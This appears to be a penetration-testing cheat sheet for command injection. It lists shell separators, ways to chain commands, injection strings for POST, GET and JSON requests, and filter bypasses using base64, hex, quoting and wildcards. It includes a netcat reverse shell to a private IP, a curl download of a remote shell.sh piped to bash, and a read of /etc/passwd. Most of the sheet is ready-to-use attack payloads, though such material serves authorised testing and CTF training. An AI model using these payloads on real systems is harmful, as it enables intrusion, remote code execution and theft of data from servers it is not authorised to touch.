# Command Injection

### Manual Testing

```
;
|
&&
```

For example

{% code overflow="wrap" %}
```bash
# You should encode them when sending 
something|id|ifconfig  
something;id;ifconfig
something&id&ifconfig
www.c.gov; cat /etc/passwd
www.c.gov; nc 192.168.142.148 8000 -e /bin/bash

# POST
email=test@test.com;sleep+20&subject=test&message=test
email=test@test.com;ping -c 5 10.10.14.4&subject=test&message=test

# GET
GET/remote_agent.php?
action=polldata&poller_id=;curl+http://10.10.14.39&host_id=1&local_data_ids[]=6HTTP/1.1

# Json format
{"username":"test;id;"} 

# These are special characters that might be blocked already
( ) [ ] { } " , ' ` ; # | \ &
```
{% endcode %}

#### Payloads to execute both commands

{% code overflow="wrap" %}
```bash
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id # Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
```
{% endcode %}

Some Linux specifc payloads

{% code overflow="wrap" %}
```bash
# Some special characters to include 

`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

# curl
curl 'http://hostname:8338/login' --data 'username=;`id > /tmp/bbq`'
# BURP
host=127.0.0.1&username=`curl${IFS}10.10.14.25/shell.sh|bash`
```
{% endcode %}

For example

```bash
# use `<command>` to execute the shell
# use ${IFS} to represent a 'space' 
host=127.0.0.1&username=`curl${IFS}10.10.14.25/shell.sh|bash`
```

#### Basic filtering bypass

{% code overflow="wrap" %}
```bash
# base64
# encode the command
>echo 'ping -c 5 192.168.142.141' | base64
>cGluZyAtYyA1IDE5Mi4xNjguMTQyLjE0MQo=

# decode the command and run
something|echo cGluZyAtYyA1IDE5Mi4xNjguMTQyLjE0MQo= | base64 -d | bash

# hex stings
# encode the command
echo "cat flag" | tr -d '\n' | xxd -ps -c 200x
# decode the command and run
something| echo 0x63617420666c6167 | tr -d '\n' | xxd -r -p | bash 
```
{% endcode %}

Other interesting filtering bypass

{% code overflow="wrap" %}
```bash
# String concatanation trick to code execution
https://<URL>/?name=hacker"."blah"."blah
https://<URL>/?name=hacker".system("id")."blah

# Single quotation mark bypass
w'h'o'am'I

# Double Quotes Bypass
w"h"o"am"I

# Backslash
c\at fl\ag

# Regular expressioins (Assume / bin/cat: test: is a directory)
/???/?[a][t] ?''?''?''?''`
`/???/?at ????`
`/???/?[a]''[t] ?''?''?''?''

# Use $@ to bypass
who$@ami

# Bypass with wildcards
powershell C:\*\*2\n??e*d.*? # notepad

# From <https://www.fatalerrors.org/a/ping-command-execution-and-bypass.html> 
```
{% endcode %}
